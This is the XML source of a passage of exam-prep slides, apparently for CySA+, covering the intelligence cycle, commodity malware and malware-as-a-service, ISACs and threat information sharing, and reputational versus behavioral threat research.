            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Find importance and meaning</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_62724d9c0f.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6912226" y="1783080"/>
            <a:ext cx="4097787" cy="429768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223</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle (5)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dissemination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Explanation of analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Recommendation of action given to customer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_b009f858a3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6919722" y="1783080"/>
            <a:ext cx="4082796" cy="429768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224</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle (6)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Feedback</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Response of the customer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  If customer requires more information, start cycle again</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_853a2d7f68.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6785914" y="1783080"/>
            <a:ext cx="4350412" cy="429768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225</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Commodity Malware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Commodity malware is mass-produced, widely available malicious software that is bought, sold, or rented in underground criminal marketplaces rather than being custom-built for one specific target.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is frequently packaged as malware-as-a-service (MaaS), where operators provide the payload, command-and-control infrastructure, and even support, letting attackers with limited technical skill launch credible campaigns for a subscription fee.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because commodity malware produces recognizable, well-documented indicators of compromise that signature-based and reputation tooling can catch, yet its low barrier to entry means these threats are extremely common and can also serve as an initial foothold for more advanced follow-on attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam contrasts commodity malware (for-sale, MaaS, low-skill attackers, known signatures) with advanced/targeted or zero-day tooling used by more capable adversaries.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226</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Commodity Malware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Malware for sale</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Popular in underground communities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Allows attackers with limited skills to engage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Malware-as-a-service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227</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Information Sharing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Information sharing is the practice of exchanging threat data, indicators of compromise, tactics, and defensive lessons among trusted organizations so that an attack detected by one party can be defended against by many.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dedicated communities exist to facilitate this exchange, most notably Information Sharing and Analysis Centers (ISACs) organized by industry sector, along with government programs, vendor feeds, and standards like STIX and TAXII that make the data machine-readable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because no single organization sees the whole threat landscape, and participating in sharing communities gives the SOC early warning of campaigns targeting their peers, effectively extending their visibility beyond their own network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on the value of participating in sharing communities and on identifying ISACs, STIX, and TAXII as the mechanisms and standards that enable threat information sharing.</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228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Information Sharing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Communities exist to facilitate information sharing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Information Sharing and Analysis Centers (ISACs)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229</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Information Sharing and Analysis Centers (ISACs)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Information Sharing and Analysis Centers (ISACs) are non-profit, sector-specific organizations that gather, analyze, and distribute cyber and physical threat intelligence among members of a critical-infrastructure industry.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  They are organized by vertical so that members face similar adversaries and regulations, with well-known examples including the Automotive, Aviation, Communications, Electricity, Elections, Financial Services (FS-ISAC), Healthcare (H-ISAC), Information Technology (IT-ISAC), and Multi-State (MS-ISAC) centers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because an ISAC delivers curated intelligence relevant to their exact industry, giving the SOC actionable warnings about campaigns and vulnerabilities specifically aimed at their sector rather than generic global noise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may ask you to match an organization to the correct sector-based ISAC (for example FS-ISAC for financial services or MS-ISAC for state/local government).</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230</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Information Sharing and Analysis Centers (ISACs)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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Example industries:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Automotive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Aviation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Communications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Electricity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Elections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Financial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Healthcare</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_c730b7c3ea.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976224" y="1783080"/>
            <a:ext cx="3969791" cy="429768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231</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Information Sharing and Analysis Centers (ISACs)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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Example industries:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Information technology</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  MultiState</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_c730b7c3ea.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976224" y="1783080"/>
            <a:ext cx="3969791" cy="429768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232</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Cyber Warfare Timeline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g_ccaa604261.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2153281" y="1783080"/>
            <a:ext cx="7882390" cy="4434840"/>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233</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research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Threat research is the ongoing study of adversaries, malware, and attack techniques to add context to alerts and to uncover novel tactics, techniques, and procedures (TTPs) that existing signature-based controls may miss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reputational research assigns a general perceived-risk rating to indicators such as domains, IP addresses, URLs, and file hashes using services like Google Safe Browsing, the Cisco Talos Reputation Center, and VirusTotal, while behavioral research focuses on how a threat actually acts by observing patterns, sandbox detonation, and anomalous activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because combining reputational and behavioral research lets them enrich raw alerts with meaning, prioritize true positives, and detect emerging threats that have no established signature yet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ distinguishes reputational research (risk scoring of indicators via tools like VirusTotal and Talos) from behavioral research (analyzing how a threat operates), and tests recognizing which approach catches novel TTPs.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234</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research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Useful to</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Add context to alerts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uncover novel TTPs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Existing controls may miss these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235</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research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Reputational</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Rating of general perceived risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Google’s Safe Browsing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Talos Reputation Center</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  VirusTotal</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236</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research (3)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Behavioral</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Create local environment to test (i.e., sandbox)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Protected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Launch virtual machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Run malicious software safely</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237</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research (4)</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Indicator of compromise (IOC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ISACs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Computer Incident Response Center Luxembourg (CIRCL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  FBI’s InfraGard</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238</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

